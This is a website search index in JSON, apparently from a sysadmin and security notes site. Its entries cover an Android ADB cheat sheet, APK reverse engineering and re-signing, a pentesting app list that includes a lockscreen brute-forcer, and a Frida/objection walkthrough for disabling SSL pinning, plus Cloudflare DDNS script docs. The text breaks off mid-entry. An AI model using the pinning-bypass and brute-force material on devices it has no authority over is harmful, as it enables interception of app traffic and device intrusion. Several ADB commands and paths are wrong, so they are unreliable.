{"config": {"lang": ["en"], "separator": "[\\s\\-]+", "pipeline": ["stopWordFilter"]}, "docs": [{"location": "android/adb-cheat-sheet/", "title": "Android ADB Cheat Sheet", "text": "<p>ADB, Android Debug Bridge, is a command-line utility included with Google's Android SDK. ADB can control your device over USB from a computer, copy files back and forth, install and uninstall apps, run shell commands, and more. ADB is a powerful tool that can be used to control your Android device from a computer. Below are some of the most common commands you can use with ADB and their usage. You can find more information about ADB and its usage by visiting the official website.</p>", "tags": ["android", "adb", "cheat-sheet"]}, {"location": "android/adb-cheat-sheet/#common-adb-commands", "title": "Common ADB Commands", "text": "", "tags": ["android", "adb", "cheat-sheet"]}, {"location": "android/adb-cheat-sheet/#push-a-file-to-download-folder-of-the-android-device", "title": "Push a file to Download folder of the Android Device", "text": "<pre><code>adb push example.apk /mnt/sdcard/Download/\n</code></pre>", "tags": ["android", "adb", "cheat-sheet"]}, {"location": "android/adb-cheat-sheet/#lists-all-the-installed-packages-and-get-the-full-paths", "title": "Lists all the installed packages and get the full paths", "text": "<pre><code>adb shell pm list packages -f\n</code></pre>", "tags": ["android", "adb", "cheat-sheet"]}, {"location": "android/adb-cheat-sheet/#pulls-a-file-from-android-device", "title": "Pulls a file from android device", "text": "<pre><code>adb pull /mnt/sdcard/Download/example.apk\n</code></pre>", "tags": ["android", "adb", "cheat-sheet"]}, {"location": "android/adb-cheat-sheet/#install-apk-from-host-to-android-device", "title": "Install apk from host to Android device", "text": "<pre><code>adb shell install example.apk\n</code></pre>", "tags": ["android", "adb", "cheat-sheet"]}, {"location": "android/adb-cheat-sheet/#install-apk-from-android-device-storage", "title": "Install apk from Android device storage", "text": "<pre><code>adb shell install /mnt/sdcard/Download/example.apk\n</code></pre>", "tags": ["android", "adb", "cheat-sheet"]}, {"location": "android/adb-cheat-sheet/#set-network-proxy", "title": "Set network proxy", "text": "<pre><code>adb shell settings put global http_proxy &lt;address&gt;:&lt;port&gt;\n</code></pre> <p>Disable network proxy</p> <pre><code>adb shell settings put global http_proxy :0\n</code></pre>", "tags": ["android", "adb", "cheat-sheet"]}, {"location": "android/adb-cheat-sheet/#adb-basics-commands", "title": "ADB Basics Commands", "text": "Command Description adb devices Lists connected devices adb connect 192.168.2.1 Connects to adb device over network adb root Restarts adbd with root permissions adb start-server Starts the adb server adb kill-server Kills the adb server adb reboot Reboots the device adb devices -l List of devices by product/model adb -s <code>&lt;deviceName&gt; &lt;command&gt;</code> Redirect command to specific device adb \u2013d <code>&lt;command&gt;</code> Directs command to only attached USB device adb \u2013e <code>&lt;command&gt;</code> Directs command to only attached emulator", "tags": ["android", "adb", "cheat-sheet"]}, {"location": "android/adb-cheat-sheet/#logs", "title": "Logs", "text": "Command Description adb logcat <code>[options] [filter] [filter]</code> View device log adb bugreport Print bug reports", "tags": ["android", "adb", "cheat-sheet"]}, {"location": "android/adb-cheat-sheet/#permissions", "title": "Permissions", "text": "Command Description adb shell permissions groups List permission groups definitions adb shell list permissions -g -r List permissions details", "tags": ["android", "adb", "cheat-sheet"]}, {"location": "android/adb-cheat-sheet/#package-installation", "title": "Package Installation", "text": "Command Description adb shell install <code>&lt;apk&gt;</code> Install app adb shell install <code>&lt;path&gt;</code> Install app from phone path adb shell install -r <code>&lt;path&gt;</code> Install app from phone path adb shell uninstall <code>&lt;name&gt;</code> Remove the app", "tags": ["android", "adb", "cheat-sheet"]}, {"location": "android/adb-cheat-sheet/#paths", "title": "Paths", "text": "Command Description /data/data/<code>&lt;package name&gt;</code>/databases App databases /data/data/<code>&lt;package name&gt;</code>/shared_prefs/ Shared preferences /mnt/sdcard/Download/ Download folder /data/app Apk installed by user /system/app Pre-installed APK files /mmt/asec Encrypted apps (App2SD) /mmt/emmc Internal SD Card /mmt/adcard External/Internal SD Card /mmt/adcard/external_sd External SD Card ------- ----------- adb shell ls List directory contents adb shell ls -s Print size of each file adb shell ls -R List subdirectories recursively adb shell pm path <code>&lt;package name&gt;</code> Get full path of a package adb shell pm list packages -f Lists all the packages and full paths", "tags": ["android", "adb", "cheat-sheet"]}, {"location": "android/adb-cheat-sheet/#file-operations", "title": "File Operations", "text": "Command Description adb push <code>&lt;local&gt; &lt;remote&gt;</code> Copy file/dir to device adb pull <code>&lt;remote&gt; &lt;local&gt;</code> Copy file/dir from device run-as <code>&lt;package&gt;</code> cat <code>&lt;file&gt;</code> Access the private package files", "tags": ["android", "adb", "cheat-sheet"]}, {"location": "android/adb-cheat-sheet/#phone-info", "title": "Phone Info", "text": "Command Description adb get-stat\u0435 Print device state adb get-serialno Get the serial number adb shell dumpsys iphonesybinfo Get the IMEI adb shell netstat List TCP connectivity adb shell pwd Print current working directory adb shell dumpsys battery Battery status adb shell pm list features List phone features adb shell service list List all services adb shell dumpsys activity <code>&lt;package&gt;/&lt;activity&gt;</code> Activity info adb shell ps Print process status adb shell wm size Displays the current screen resolution", "tags": ["android", "adb", "cheat-sheet"]}, {"location": "android/adb-cheat-sheet/#package-info", "title": "Package Info", "text": "Command Description adb shell list packages Lists package names adb shell list packages -r Lists package name + path to apks adb shell list packages -3 Lists third party package names adb shell list packages -s Lists only system packages adb shell list packages -u Lists package names + uninstalled adb shell dumpsys package packages Lists info on all apps adb shell dump <code>&lt;name&gt;</code> Lists info on one package adb shell path <code>&lt;package&gt;</code> Path to the apk file", "tags": ["android", "adb", "cheat-sheet"]}, {"location": "android/adb-cheat-sheet/#device-related-commands", "title": "Device Related Commands", "text": "Command Description adb reboot recovery Reboot device into recovery mode adb reboot fastboot Reboot device into recovery mode adb shell screencap -p \"/path/to/screenshot.png\" Capture screenshot adb shell screenrecord \"/path/to/record.mp4\" Record device screen adb backup -apk -all -f backup.ab Backup settings and apps adb backup -apk -shared -all -f backup.ab Backup settings, apps and shared storage adb backup -apk -nosystem -all -f backup.ab Backup only non-system apps adb restore backup.ab Restore a previous backup ------- ----------- adb shell am start -a android.intent.action.VIEW -d URL Opens URL adb shell am start -t image/* -a android.intent.action.VIEW Opens gallery", "tags": ["android", "adb", "cheat-sheet"]}, {"location": "android/apktool/", "title": "Android Apktool for Reverse Engineering", "text": "<p>A tool for reverse engineering 3<sup>rd</sup> party, closed, binary Android apps. It can decode resources to nearly original form and rebuild them after making some modifications. It also makes working with an app easier because of the project like file structure and automation of some repetitive tasks like building apk, etc.</p> <p>It is <code>NOT</code> intended for piracy and other non-legal uses. It could be used for localizing, adding some features or support for custom platforms, analyzing applications and much more.</p>", "tags": ["android", "penetration-testing", "reverse-engineering", "apktool"]}, {"location": "android/apktool/#download-and-documentation", "title": "Download and Documentation", "text": "<p>Official Apktool Website</p>", "tags": ["android", "penetration-testing", "reverse-engineering", "apktool"]}, {"location": "android/apktool/#how-to-sign-apk-after-compile", "title": "How to Sign APK After Compile", "text": "<p>In order to install modified APK on Android device, you need to sign it with a certificate. Android APK won't be signed by default. You need to sign it manually.</p> <p>Install apksigner</p> <pre><code>apt install -y apksigner\n</code></pre> <p>Create certificate at the same folder you've compiled your modified APK</p> <pre><code>keytool -genkey -v -keystore keystore.jks -keyalg RSA -keysize 2048 -validity 10000\n</code></pre> <p>Enter A password (we will need it to singe the APK), enter any data you wish for the certificate information. At the end enter 'y' at the end to create the certificate.</p> <p>Now we should have 2 files: your.apk, keystore.jks. The only step left is to singe the APK with new certificate.</p> <pre><code>apksigner sign --ks keystore.jks your.apk\n</code></pre> <p>When installing the APK you will be prompted with a warning of \"unknown certificate\" just hit Install.</p>", "tags": ["android", "penetration-testing", "reverse-engineering", "apktool"]}, {"location": "android/applications/", "title": "Penetration Testing Application for Android", "text": "<p>List for Android penetration testing applications and tools that can be used to aid in penetration testing. The following are the most commonly used applications. Feel free to suggest new applications and tools at comments section below.</p>", "tags": ["android", "application", "penetration-testing"]}, {"location": "android/applications/#list-of-android-penetration-testing-tools-and-applications", "title": "List of Android Penetration Testing Tools and Applications", "text": "<ul> <li>Magisk Manager - Systemless rooting system.</li> <li>EdXposed Manager - Companion Android application for EdXposed.</li> <li>BusyBox - Android busyBox.</li> <li>SQLite Editor Master - SQLite Editor.</li> <li>Root Explorer File Manager for Root Users (Root Required).</li> <li>CiLocks - Python script to brute force android lockscreen password.</li> <li>Network Analyzer - Network Analyzer for Android.</li> <li>Packet Capture - Packet capture/Network traffic sniffer.</li> <li>Gplaycli Cli Tool to download APK form PlayStore.</li> </ul>", "tags": ["android", "application", "penetration-testing"]}, {"location": "android/jadx-decompiler/", "title": "JADX - Dex to Java Decompiler", "text": "<p>Github Repository: skylot-jadx</p>", "tags": ["android", "decompiler", "java"]}, {"location": "android/jadx-decompiler/#about-jadx", "title": "About JADX", "text": "<p>Command line and GUI tools for producing Java source code from Android Dex and Apk files</p> <p> Please note that in most cases jadx can't decompile all 100% of the code, so errors will occur. Check Troubleshooting guide for workarounds</p> <p>Main features:</p> <ul> <li>decompile Dalvik bytecode to java classes from APK, dex, aar, aab and zip files</li> <li>decode <code>AndroidManifest.xml</code> and other resources from <code>resources.arsc</code></li> <li>deobfuscator included</li> </ul> <p>jadx-gui features:</p> <ul> <li>view decompiled code with highlighted syntax</li> <li>jump to declaration</li> <li>find usage</li> <li>full text search</li> <li>smali debugger, check wiki page for setup and usage</li> </ul> <p>Jadx-gui key bindings can be found here</p> <p>See these features in action here: jadx-gui features overview</p> <p></p>", "tags": ["android", "decompiler", "java"]}, {"location": "android/jadx-decompiler/#download", "title": "Download", "text": "<ul> <li>release   from github: </li> <li>latest unstable build </li> </ul> <p>After download unpack zip file go to <code>bin</code> directory and run: - <code>jadx</code> - command line version - <code>jadx-gui</code> - UI version</p> <p>On Windows run <code>.bat</code> files with double-click\\ Note: ensure you have installed Java 11 or later 64-bit version. For Windows, you can download it from oracle.com (select x64 Installer).</p>", "tags": ["android", "decompiler", "java"]}, {"location": "android/jadx-decompiler/#installation", "title": "Installation", "text": "<ul> <li>Arch Linux    <pre><code>sudo pacman -S jadx\n</code></pre></li> <li>macOS    <pre><code>brew install jadx\n</code></pre></li> <li>Flathub    <pre><code>flatpak install flathub com.github.skylot.jadx\n</code></pre></li> </ul>", "tags": ["android", "decompiler", "java"]}, {"location": "android/jadx-decompiler/#usage", "title": "Usage", "text": "<p><pre><code>jadx[-gui] [command] [options] &lt;input files&gt; (.apk, .dex, .jar, .class, .smali, .zip, .aar, .arsc, .aab, .xapk, .jadx.kts)\ncommands (use '&lt;command&gt; --help' for command options):\n  plugins     - manage jadx plugins\n\noptions:\n  -d, --output-dir                    - output directory\n  -ds, --output-dir-src               - output directory for sources\n  -dr, --output-dir-res               - output directory for resources\n  -r, --no-res                        - do not decode resources\n  -s, --no-src                        - do not decompile source code\n  --single-class                      - decompile a single class, full name, raw or alias\n  --single-class-output               - file or dir for write if decompile a single class\n  --output-format                     - can be 'java' or 'json', default: java\n  -e, --export-gradle                 - save as android gradle project\n  -j, --threads-count                 - processing threads count, default: 4\n  -m, --decompilation-mode            - code output mode:\n                                         'auto' - trying best options (default)\n                                         'restructure' - restore code structure (normal java code)\n                                         'simple' - simplified instructions (linear, with goto's)\n                                         'fallback' - raw instructions without modifications\n  --show-bad-code                     - show inconsistent code (incorrectly decompiled)\n  --no-xml-pretty-print               - do not prettify XML\n  --no-imports                        - disable use of imports, always write entire package name\n  --no-debug-info                     - disable debug info parsing and processing\n  --add-debug-lines                   - add comments with debug line numbers if available\n  --no-inline-anonymous               - disable anonymous classes inline\n  --no-inline-methods                 - disable methods inline\n  --no-move-inner-classes             - disable move inner classes into parent\n  --no-inline-kotlin-lambda           - disable inline for Kotlin lambdas\n  --no-finally                        - don't extract finally block\n  --no-replace-consts                 - don't replace constant value with matching constant field\n  --escape-unicode                    - escape non latin characters in strings (with \\u)\n  --respect-bytecode-access-modifiers - don't change original access modifiers\n  --mappings-path                     - deobfuscation mappings file or directory. Allowed formats: Tiny and Tiny v2 (both '.tiny'), Enigma (.mapping) or Enigma directory\n  --mappings-mode                     - set mode for handling the deobfuscation mapping file:\n                                         'read' - just read, user can always save manually (default)\n                                         'read-and-autosave-every-change' - read and autosave after every change\n                                         'read-and-autosave-before-closing' - read and autosave before exiting the app or closing the project\n                                         'ignore' - don't read or save (can be used to skip loading mapping files referenced in the project file)\n  --deobf                             - activate deobfuscation\n  --deobf-min                         - min length of name, renamed if shorter, default: 3\n  --deobf-max                         - max length of name, renamed if longer, default: 64\n  --deobf-whitelist                   - space separated list of classes (full name) and packages (ends with '.*') to exclude from deobfuscation, default: android.support.v4.* android.support.v7.* android.support.v4.os.* android.support.annotation.Px androidx.core.os.* androidx.annotation.Px\n  --deobf-cfg-file                    - deobfuscation mappings file used for JADX auto-generated names (in the JOBF file format), default: same dir and name as input file with '.jobf' extension\n  --deobf-cfg-file-mode               - set mode for handling the JADX auto-generated names' deobfuscation map file:\n                                         'read' - read if found, don't save (default)\n                                         'read-or-save' - read if found, save otherwise (don't overwrite)\n                                         'overwrite' - don't read, always save\n                                         'ignore' - don't read and don't save\n  --deobf-use-sourcename              - use source file name as class name alias\n  --deobf-res-name-source             - better name source for resources:\n                                         'auto' - automatically select best name (default)\n                                         'resources' - use resources names\n                                         'code' - use R class fields names\n  --use-kotlin-methods-for-var-names  - use kotlin intrinsic methods to rename variables, values: disable, apply, apply-and-hide, default: apply\n  --rename-flags                      - fix options (comma-separated list of):\n                                         'case' - fix case sensitivity issues (according to --fs-case-sensitive option),\n                                         'valid' - rename java identifiers to make them valid,\n                                         'printable' - remove non-printable chars from identifiers,\n                                        or single 'none' - to disable all renames\n                                        or single 'all' - to enable all (default)\n  --integer-format                    - how integers are displayed:\n                                         'auto' - automatically select (default)\n                                         'decimal' - use decimal\n                                         'hexadecimal' - use hexadecimal\n  --fs-case-sensitive                 - treat filesystem as case sensitive, false by default\n  --cfg                               - save methods control flow graph to dot file\n  --raw-cfg                           - save methods control flow graph (use raw instructions)\n  -f, --fallback                      - set '--decompilation-mode' to 'fallback' (deprecated)\n  --use-dx                            - use dx/d8 to convert java bytecode\n  --comments-level                    - set code comments level, values: error, warn, info, debug, user-only, none, default: info\n  --log-level                         - set log level, values: quiet, progress, error, warn, info, debug, default: progress\n  -v, --verbose                       - verbose output (set --log-level to DEBUG)\n  -q, --quiet                         - turn off output (set --log-level to QUIET)\n  --version                           - print jadx version\n  -h, --help                          - print this help\n\nPlugin options (-P&lt;name&gt;=&lt;value&gt;):\n 1) dex-input: Load .dex and .apk files\n    - dex-input.verify-checksum       - verify dex file checksum before load, values: [yes, no], default: yes\n 2) java-convert: Convert .class, .jar and .aar files to dex\n    - java-convert.mode               - convert mode, values: [dx, d8, both], default: both\n    - java-convert.d8-desugar         - use desugar in d8, values: [yes, no], default: no\n 3) kotlin-metadata: Use kotlin.Metadata annotation for code generation\n    - kotlin-metadata.class-alias     - rename class alias, values: [yes, no], default: yes\n    - kotlin-metadata.method-args     - rename function arguments, values: [yes, no], default: yes\n    - kotlin-metadata.fields          - rename fields, values: [yes, no], default: yes\n    - kotlin-metadata.companion       - rename companion object, values: [yes, no], default: yes\n    - kotlin-metadata.data-class      - add data class modifier, values: [yes, no], default: yes\n    - kotlin-metadata.to-string       - rename fields using toString, values: [yes, no], default: yes\n    - kotlin-metadata.getters         - rename simple getters to field names, values: [yes, no], default: yes\n 4) rename-mappings: various mappings support\n    - rename-mappings.format          - mapping format, values: [AUTO, TINY_FILE, TINY_2_FILE, ENIGMA_FILE, ENIGMA_DIR, SRG_FILE, XSRG_FILE, CSRG_FILE, TSRG_FILE, TSRG_2_FILE, PROGUARD_FILE], default: AUTO\n    - rename-mappings.invert          - invert mapping on load, values: [yes, no], default: no\n\nEnvironment variables:\n  JADX_DISABLE_XML_SECURITY - set to 'true' to disable all security checks for XML files\n  JADX_DISABLE_ZIP_SECURITY - set to 'true' to disable all security checks for zip files\n  JADX_ZIP_MAX_ENTRIES_COUNT - maximum allowed number of entries in zip files (default: 100 000)\n  JADX_CONFIG_DIR - custom config directory, using system by default\n  JADX_CACHE_DIR - custom cache directory, using system by default\n  JADX_TMP_DIR - custom temp directory, using system by default\n\nExamples:\n  jadx -d out classes.dex\n  jadx --rename-flags \"none\" classes.dex\n  jadx --rename-flags \"valid, printable\" classes.dex\n  jadx --log-level ERROR app.apk\n  jadx -Pdex-input.verify-checksum=no app.apk\n</code></pre> These options also work in jadx-gui running from command line and override options from preferences' dialog</p>", "tags": ["android", "decompiler", "java"]}, {"location": "android/jadx-decompiler/#use-jadx-as-a-library", "title": "Use jadx as a Library", "text": "<p>You can use jadx in your java projects, check details on wiki page</p>", "tags": ["android", "decompiler", "java"]}, {"location": "android/mobsf/", "title": "Mobile Security Framework (MobSF)", "text": "<p>Mobile Security Framework (MobSF) is an automated, all-in-one mobile application (Android/iOS/Windows) pen-testing, malware analysis and security assessment framework capable of performing static and dynamic analysis. MobSF support mobile app binaries (APK, XAPK, IPA &amp; APPX) along with zipped source code and provides REST APIs for seamless integration with your CI/CD or DevSecOps pipeline.The Dynamic Analyzer helps you to perform runtime security assessment and interactive instrumented testing.</p> <p>Follow the projet at github: MobSF/Mobile-Security-Framework-MobSF</p> <p></p>", "tags": ["android", "penetration-testing"]}, {"location": "android/mobsf/#running-mobsf-as-docker", "title": "Running MobSF as Docker", "text": "<p>Below is a <code>docker run</code> command for running MobSF as a Docker container.</p> <pre><code>docker run \\\n-d \\\n-it \\\n-v /root/tools/mobSF:/root/.MobSF \\\n-h mobsf \\\n--name mobsf \\\n--restart always \\\n-p 8005:8000 \\\nopensecurity/mobile-security-framework-mobsf:latest\n</code></pre> <p>docker compose example for <code>docker-compose.yml</code>:</p> <pre><code>version: '2.4'\n\nservices:\n  mobsf:\n    image: opensecurity/mobile-security-framework-mobsf\n    container_name: mobsf\n    hostname: mobsf\n    restart: always\n    network_mode: bridge\n    volumes:\n      - ./:/root/.MobSF\n      - /etc/localtime:/etc/localtime\n    ports:\n      - '1337:1337'\n      - '8000:8000'\n</code></pre>", "tags": ["android", "penetration-testing"]}, {"location": "android/ssl-pinning-bypass/", "title": "Android SSL Pinning Bypass with Frida", "text": "", "tags": ["android", "frida", "ssl-pinning"]}, {"location": "android/ssl-pinning-bypass/#whats-ssl-pinning", "title": "Whats SSL Pinning?", "text": "<p>Android app establishes an HTTPS connection, it checks the issuer of the server's certificate against the internal list of trusted Android system certificate authorities to make sure it is communicating with a trusted server. This is called SSL Pinning. If the server's certificate is not in the list of trusted certificates, the app won't be able to communicate with the server.</p>", "tags": ["android", "frida", "ssl-pinning"]}, {"location": "android/ssl-pinning-bypass/#whats-frida", "title": "Whats Frida?", "text": "<p>Frida is dynamic instrumentation toolkit for developers, reverse-engineers, and security researchers. It is a powerful tool that allows you to modify Android applications and libraries without having to recompile them.</p>", "tags": ["android", "frida", "ssl-pinning"]}, {"location": "android/ssl-pinning-bypass/#requirements", "title": "Requirements", "text": "<ul> <li>Rooted Adnroid Phone</li> <li>Python 3</li> <li>pip(pip3)</li> </ul>", "tags": ["android", "frida", "ssl-pinning"]}, {"location": "android/ssl-pinning-bypass/#installation", "title": "Installation", "text": "<p>Install Frida framework, objection to your host os.</p> <pre><code>pip install frida-tools\npip install objection\n</code></pre> <p>Download the proper version from: Frida Server Downloads</p> <p>Danger</p> <p>Make sure to download the proper version of Frida Server for your Android cpu architecture. Alwasys use the latest version of Frida Server and frida-tools</p> <p>Extract and rename the file to frida-server Move the file to the Adnroid Phone to /data/local/tmp/</p>", "tags": ["android", "frida", "ssl-pinning"]}, {"location": "android/ssl-pinning-bypass/#usage", "title": "Usage", "text": "<p>Connect to adb shell to the android device</p> <p>For more inforatmati</p> <pre><code>adb shell\n</code></pre> <p>Change user to Root</p> <pre><code>su\n</code></pre> <p>Make sure you are running as root with the folowing command:</p> <pre><code>whoami\n</code></pre> <p>Change permissions to the /data/local/tmp/frida-server to be able to run the server</p> <pre><code>chmod 755 /data/local/tmp/frida-server\n</code></pre> <p>Run the Frida Server in background:</p> <pre><code>/data/local/tmp/frida-server\n</code></pre> <p>Warning</p> <p>Do no close the terminal - this will stop the Frida Server</p> <p>Go Back to host's terminal List all the Applications and find the name of the desired application you want to by bypass SSL Pinning</p> <pre><code>frida-ps -Ua\n</code></pre> <p>Now Run with the name of the application</p> <pre><code>objection -g c**********n explore -q\n</code></pre> <p>Now remove the SSL Pining with</p> <pre><code>android sslpinning disable\n</code></pre>", "tags": ["android", "frida", "ssl-pinning"]}, {"location": "android/ssl-pinning-bypass/#set-proxy-for-applciation-with-frida-and-objection", "title": "Set Proxy for Applciation with frida and objection", "text": "<pre><code>android proxy set 192.168.5.102 8081\n</code></pre>", "tags": ["android", "frida", "ssl-pinning"]}, {"location": "automation/ddns-cloudflare-bash/", "title": "DDNS Cloudflare Bash Script", "text": "<p>When building complex infrastructure and managing multiple servers and services using ip addresses is can create a lot of issues and is not always easy to manage. The preferred way is to use a DNS provider that allows you to manage your domain names and their associated IP addresses. DDNS Cloudflare Bash script is a simple bash script that allows you to easily update your <code>Cloudflare's DNS records</code> dinamically regardless of your current IP address. DDNS Cloudflare Bash Script can be used on Linux, Unix, FreeBSD, and macOS with only one requirment of <code>curl</code></p> <p>Source code can be found at DDNS Cloudflare Bash Github Repository.</p> <p> </p>", "tags": ["automation", "cloudflare", "ddns", "bash"]}, {"location": "automation/ddns-cloudflare-bash/#about", "title": "About", "text": "<ul> <li>DDNS Cloudflare Bash Script for most Linux, Unix distributions and MacOS.</li> <li>Choose any source IP address to update external or internal (WAN/LAN).</li> <li>For multiply lan interfaces like Wifi, Docker Networks and Bridges the script will automatically detects the primary Interface by priority.</li> <li>Cloudflare's options proxy and TTL configurable via the config file.</li> <li>Optional Telegram Notifications</li> </ul>", "tags": ["automation", "cloudflare", "ddns", "bash"]}, {"location": "automation/ddns-cloudflare-bash/#requirements", "title": "Requirements", "text": "<ul> <li>curl</li> <li>Cloudflare api-token with ZONE-DNS-EDIT Permissions</li> <li>DNS Record must be pre created (api-token should only edit dns records)</li> </ul>", "tags": ["automation", "cloudflare", "ddns", "bash"]}, {"location": "automation/ddns-cloudflare-bash/#creating-cloudflare-api-token", "title": "Creating Cloudflare API Token", "text": "<p>To create a CloudFlare API token for your DNS zone go to https://dash.cloudflare.com/profile/api-tokens and follow these steps:</p> <ol> <li>Click Create Token</li> <li>Select Create Custom Token</li> <li>Provide the token a name, for example, <code>example.com-dns-zone-readonly</code></li> <li>Grant the token the following permissions:    - Zone - DNS - Edit</li> <li>Set the zone resources to:    - Include - Specific Zone - <code>example.com</code></li> <li>Complete the wizard and use the generated token at the <code>CLOUDFLARE_API_TOKEN</code> variable for the container</li> </ol>", "tags": ["automation", "cloudflare", "ddns", "bash"]}, {"location": "automation/ddns-cloudflare-bash/#installation", "title": "Installation", "text": "<p>[!tip] This article has an easier explanation for deploying this script.</p> <p>You can place the script at any location manually.</p> <p>MacOS: Don't use the /usr/local/bin/ for the script location. Create a separate folder under your user path /Users/${USER}</p> <p>The automatic install examples below will place the script at /usr/local/bin/</p> <pre><code>wget https://raw.githubusercontent.com/fire1ce/DDNS-Cloudflare-Bash/main/update-cloudflare-dns.sh\nsudo chmod +x update-cloudflare-dns.sh\nsudo mv update-cloudflare-dns.sh /usr/local/bin/update-cloudflare-dns\n</code></pre>", "tags": ["automation", "cloudflare", "ddns", "bash"]}, {"location": "automation/ddns-cloudflare-bash/#config-file", "title": "Config file", "text": "<p>You can use default config file update-cloudflare-dns.conf or pass your own config file as parameter to script.</p> <pre><code>wget https://raw.githubusercontent.com/fire1ce/DDNS-Cloudflare-Bash/main/update-cloudflare-dns.conf\n</code></pre> <p>Place the config file in the directory as the update-cloudflare-dns for above example at /usr/local/bin/</p> <pre><code>sudo mv update-cloudflare-dns.conf /usr/local/bin/update-cloudflare-dns.conf\n</code></pre>", "tags": ["automation", "cloudflare", "ddns", "bash"]}, {"location": "automation/ddns-cloudflare-bash/#config-parameters", "title": "Config Parameters", "text": "Option Example Description what_ip internal Which IP should be used for the record: internal/external dns_record ddns.example.com DNS A record which will be updated, you can pass multiple A records separated by comma cloudflare_zone_api_token ChangeMe Cloudflare API Token KEEP IT PRIVATE!!!! zoneid ChangeMe Cloudflare's Zone ID proxied false Use Cloudflare proxy on dns record true/false ttl 120 120-7200 in seconds or 1 for Auto", "tags": ["automation", "cloudflare", "ddns", "bash"]}, {"location": "automation/ddns-cloudflare-bash/#optional-notifications-parameters", "title": "Optional Notifications Parameters", "text": "Option Example Description notify_me_telegram yes Use Telegram notifications yes/no telegram_chat_id ChangeMe Chat ID of the bot telegram_bot_API_Token ChangeMe Telegram's Bot API Token", "tags": ["automation", "cloudflare", "ddns", "bash"]}, {"location": "automation/ddns-cloudflare-bash/#running-the-script", "title": "Running The Script", "text": "<p>When placed in /usr/local/bin/</p> <pre><code>update-cloudflare-dns\n</code></pre> <p>With your config file (need to be placed in same folder)</p> <pre><code>update-cloudflare-dns yoru_config.conf\n</code></pre> <p>Or manually</p> <pre><code>&lt;path&gt;/.update-cloudflare-dns.sh\n</code></pre>", "tags": ["automation", "cloudflare", "ddns", "bash"]}, {"location": "automation/ddns-cloudflare-bash/#automation-with-crontab", "title": "Automation With Crontab", "text": "<p>You can run the script via crontab</p> <pre><code>crontab -e\n</code></pre>", "tags": ["automation", "cloudflare", "ddns", "bash"]}, {"location": "automation/ddns-cloudflare-bash/#examples", "title": "Examples", "text": "<p>Run every minute</p> <pre><code>* * * * * /usr/local/bin/update-cloudflare-dns\n</code></pre> <p>Run with your specific config file</p> <pre><code>* * * * * /usr/local/bin/update-cloudflare-dns myconfig.conf\n</code></pre> <p>Run every 2 minutes</p> <pre><code>*/2 * * * * /usr/local/bin/update-cloudflare-dns\n</code></pre> <p>Run at boot</p> <pre><code>@reboot /usr/local/bin/update-cloudflare-dns\n</code></pre> <p>Run 1 minute after boot</p> <pre><code>@reboot sleep 60 &amp;&amp; /usr/local/bin/update-cloudflare-dns\n</code></pre> <p>Run at 08:00</p> <pre><code>0 8 * * * /usr/local/bin/update-cloudflare-dns\n</code></pre>", "tags": ["automation", "cloudflare", "ddns", "bash"]}, {"location": "automation/ddns-cloudflare-bash/#logs", "title": "Logs", "text": "<p>This Script will create a log file with only the last run information Log file will be located at the script's location.</p> <p>Example:</p> <pre><code>/usr/local/bin/update-cloudflare-dns.log\n</code></pre>", "tags": ["automation", "cloudflare", "ddns", "bash"]}, {"location": "automation/ddns-cloudflare-bash/#limitations", "title": "Limitations", "text": "<ul> <li>Does not support IPv6</li> </ul>", "tags": ["automation", "cloudflare", "ddns", "bash"]}, {"location": "automation/ddns-cloudflare-bash/#license", "title": "License", "text": "", "tags": ["automation", "cloudflare", "ddns", "bash"]}, {"location": "automation/ddns-cloudflare-bash/#mit-license", "title": "MIT License", "text": "<p>Copyright\u00a9 3os.org @2020</p> <p>Permission is hereby granted, free of charge, to any person obtaining a copy of this software and associated documentation files (the \"Software\"), to deal in the Software without restriction, including without limitation the rights to use, copy, modify, merge, publish, distribute, sublicense, and/or sell copies of the Software, and to permit persons to whom the Software is furnished to do so, subject to the following conditions:</p> <p>The above copyright notice and this permission notice shall be included in all copies or substantial portions of the Software.</p> <p>THE SOFTWARE IS PROVIDED \"AS IS\", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY, FITNESS FOR A PARTICULAR PURPOSE AND NON-INFRINGEMENT. IN NO EVENT SHALL THE AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM, OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN THE SOFTWARE.</p>", "tags": ["automation", "cloudflare", "ddns", "bash"]}, {"location": "automation/ddns-cloudflare-powershell/", "title": "DDNS Cloudflare PowerShell Script", "text": "<p>When building complex infrastructure and managing multiple servers and services using ip addresses is can create a lot of issues and is not always easy to manage. The preferred way is to use a DNS provider that allows you to manage your domain names and their associated IP addresses. DDNS Cloudflare PowerShell script is a simple PowerShell script that allows you to easily update your <code>Cloudflare's DNS records</code> dinamically regardless of your current IP address. DDNS Cloudflare PowerShell Script can be used on Windows operating systems without any requirements for PowerShell.</p> <p>Source code can be found at DDNS Cloudflare PowerShell Github Repository.</p> <p> </p> <ul> <li>DDNS Cloudflare PowerShell script for Windows.</li> <li>Choose any source IP address to update external or internal (WAN/LAN).</li> <li>For multiple LAN interfaces like Wifi, Docker Networks and Bridges the script will automatically detect the primary Interface by priority.</li> <li>Cloudflare's options for proxy and TTL configurable via the parameters.</li> <li>Optional Telegram or Discord Notifications</li> </ul>", "tags": ["automation", "cloudflare", "ddns", "powershell"]}, {"location": "automation/ddns-cloudflare-powershell/#requirements", "title": "Requirements", "text": "<ul> <li>Cloudflare api-token with ZONE-DNS-EDIT Permissions</li> <li>DNS Record must be pre created (api-token should only edit dns records)</li> <li>Enabled running unsigned PowerShell</li> </ul>", "tags": ["automation", "cloudflare", "ddns", "powershell"]}, {"location": "automation/ddns-cloudflare-powershell/#creating-cloudflare-api-token", "title": "Creating Cloudflare API Token", "text": "<p>To create a CloudFlare API token for your DNS zone go to https://dash.cloudflare.com/profile/api-tokens and follow these steps:</p> <ol> <li>Click Create Token</li> <li>Select Create Custom Token</li> <li>Provide the token a name, for example, <code>example.com-dns-zone-readonly</code></li> <li>Grant the token the following permissions:    - Zone - DNS - Edit</li> <li>Set the zone resources to:    - Include - Specific Zone - <code>example.com</code></li> <li>Complete the wizard and use the generated token at the <code>CLOUDFLARE_API_TOKEN</code> variable for the container</li> </ol>", "tags": ["automation", "cloudflare", "ddns", "powershell"]}, {"location": "automation/ddns-cloudflare-powershell/#installation", "title": "Installation", "text": "<p>Download the DDNS-Cloudflare-PowerShell 